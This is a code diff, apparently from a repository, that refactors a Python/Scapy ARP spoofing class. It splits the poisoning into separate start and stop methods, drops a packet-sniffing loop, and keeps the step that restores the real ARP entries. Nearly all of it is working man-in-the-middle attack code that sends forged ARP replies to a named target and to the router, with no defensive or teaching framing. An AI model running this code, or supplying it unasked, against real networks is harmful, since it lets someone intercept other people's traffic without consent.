@@ -15,35 +15,34 @@ class ARPSpoofer():
             raise Exception("Couldn't find target MAC")
         if not self.router_mac:
             raise Exception("Couldn't find router MAC")
+        self.poison_process = None
 
     def arp_poison(self):
-        try:
-            while 1:
-                print("Spoofing...")
-                send(ARP(op=2, pdst=self.target_ip,
-                        psrc=self.router_ip, hwdst=self.target_mac))
-                send(ARP(op=2, pdst=self.router_ip,
-                        psrc=self.target_ip, hwdst=self.router_mac))
-                sleep(3)
-        except KeyboardInterrupt:
-            print("Stopping spoofing")
+        while 1:
+            send(ARP(op=2, pdst=self.target_ip,
+                     psrc=self.router_ip, hwdst=self.target_mac), verbose=False)
+            send(ARP(op=2, pdst=self.router_ip,
+                     psrc=self.target_ip, hwdst=self.router_mac), verbose=False)
+            sleep(3)
 
-    def run(self, on_pckt_callback, verbose=True):
-        multiprocessing.Process(target=self.arp_poison).start()
-        try:
-            sniff(filter='src %s' % (self.target_ip), 
-                prn=lambda x: on_pckt_callback(x))
-            sleep(1)
-        except KeyboardInterrupt as e:
-            if verbose:print("Quitting...")
-        
-        self.stop(verbose)
+    def start(self, verbose=True):
+        if verbose:
+            print("Starting ARP spoofing...")
+        self.poison_process = multiprocessing.Process(target=self.arp_poison)
+        self.poison_process.start()
 
     def stop(self, verbose=True):
+        if verbose:
+            print("Stopping ARP spoofing...")
+        if self.poison_process:
+            self.poison_process.terminate()
+            self.poison_process.join()
+            if verbose:
+                print("ARP spoofing stopped.")
+
         if verbose:
             print("Restoring targets")
         send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
              hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
         send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
              hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)
-        
